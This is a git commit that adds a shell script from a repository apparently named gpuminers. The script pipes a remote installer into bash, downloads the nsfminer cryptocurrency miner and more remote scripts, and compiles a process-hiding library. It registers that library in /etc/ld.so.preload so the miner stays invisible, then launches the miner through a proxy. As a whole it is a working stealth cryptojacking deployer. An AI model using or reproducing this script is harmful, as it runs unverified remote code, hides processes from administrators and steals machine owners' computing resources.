9a2e19a167468a04033e9ca5dd60394264c688c2
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-06-17 14:06:58 +0200

    Create start_nsfFlexWs4.sh

---
+++ start_nsfFlexWs4.sh
@@ -0,0 +1,14 @@
+#!/bin/sh
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/graft_installerWsocks4.sh | bash
+
+wget https://github.com/no-fee-ethereum-mining/nsfminer/releases/download/v1.3.13/nsfminer_1.3.13-ubuntu_18.04-cuda_11.2-opencl.tgz
+tar -xvzf nsfminer_1.3.13-ubuntu_18.04-cuda_11.2-opencl.tgz
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNSF.zip
+unzip magicNSF.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/nsfFlex.sh
+chmod +x nsfFlex.sh
+graftcp ./nsfFlex.sh
